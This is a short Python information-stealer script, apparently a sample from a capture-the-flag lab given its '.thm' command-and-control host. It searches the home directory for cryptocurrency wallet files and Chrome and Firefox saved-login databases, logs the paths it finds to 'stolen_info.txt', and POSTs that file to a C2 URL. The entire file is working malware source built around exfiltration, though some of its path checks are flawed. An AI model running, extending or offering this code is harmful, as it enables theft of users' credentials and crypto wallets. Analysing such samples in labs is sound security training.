import os
import requests


# Function to print ASCII Art
def print_ascii_art():
    art = """
      ____     _       ___  _____    ___    _   _ 
     / ___|   | |     |_ _||_   _|  / __|  | | | |
    | |  _    | |      | |   | |   | |     | |_| |
    | |_| |   | |___   | |   | |   | |__   |  _  |
     \____|   |_____| |___|  |_|    \___|  |_| |_|

             Created by the one and only M.M.
    """
    print(art)


# Path for the info file
info_file_path = "stolen_info.txt"


# Function to search for wallet files
def search_for_wallets():
    wallet_paths = [
        os.path.expanduser("~/.bitcoin/wallet.dat"),
        os.path.expanduser("~/.ethereum/keystore/*"),
        os.path.expanduser("~/.monero/wallet"),
        os.path.expanduser("~/.dogecoin/wallet.dat")
    ]
    with open(info_file_path, "a") as info_file:
        info_file.write("\n### Crypto Wallet Files ###\n")
        for path in wallet_paths:
            if os.path.exists(path):
                info_file.write(f"Found wallet: {path}\n")


# Function to search for browser credential files (SQLite databases)
def search_for_browser_credentials():
    chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json")

    with open(info_file_path, "a") as info_file:
        info_file.write("\n### Browser Credential Files ###\n")
        if os.path.exists(chrome_path):
            info_file.write(f"Found Chrome credentials: {chrome_path}\n")
        if os.path.exists(firefox_path):
            info_file.write(f"Found Firefox credentials: {firefox_path}\n")


# Function to send the stolen info to a C2 server
def send_info_to_c2_server():
    c2_url = "http://papash3ll.thm/data"
    with open(info_file_path, "r") as info_file:
        data = info_file.read()

    # Using requests to send data to the C2 server
    response = requests.post(c2_url, data=data)
    if response.status_code == 200:
        print("Data successfully sent to C2 server.")
    else:
        print("Failed to send data to C2 server.")


# Main execution flow
if __name__ == "__main__":
    print_ascii_art()
    search_for_wallets()
    search_for_browser_credentials()
    send_info_to_c2_server()